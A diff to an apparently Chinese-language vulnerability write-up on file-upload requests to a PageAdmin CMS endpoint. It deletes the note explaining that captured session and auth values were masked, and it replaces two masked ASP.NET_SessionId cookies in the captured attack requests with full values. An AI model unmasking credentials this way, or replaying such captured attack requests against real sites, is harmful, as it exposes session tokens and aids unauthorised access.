@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -53,7 +52,7 @@ schema_version: "1"
     Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
     Content-Type: application/x-www-form-urlencoded
     User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
-    Cookie: ASP.NET_SessionId=c53******************w55
+    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
     Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms
     Host: www.0-sec.org
     Content-Length: 106
@@ -79,7 +78,7 @@ schema_version: "1"
     Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49
     User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
-    Cookie: ASP.NET_SessionId=c53******************w55
+    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
     Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&from=master
     Host: www.0-sec.org
     Content-Length: 2318
